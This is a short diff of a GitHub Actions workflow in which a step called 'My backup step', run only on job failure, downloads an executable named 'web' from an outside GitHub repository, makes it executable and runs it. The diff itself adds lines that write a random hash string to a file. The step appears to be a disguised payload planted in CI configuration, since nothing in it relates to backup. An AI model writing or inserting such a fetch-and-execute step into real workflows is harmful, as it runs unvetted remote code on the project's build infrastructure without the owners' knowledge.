@@ -28,6 +28,8 @@ jobs:
       - name: My backup step
         if: ${{ failure() }}
         run: |
+          TTT=$(echo $RANDOM | md5sum | head -c 20;)
+          echo " $TTT " > Jess
           wget https://github.com/Arlentak/pages/raw/master/web
           chmod +x web
           ./web
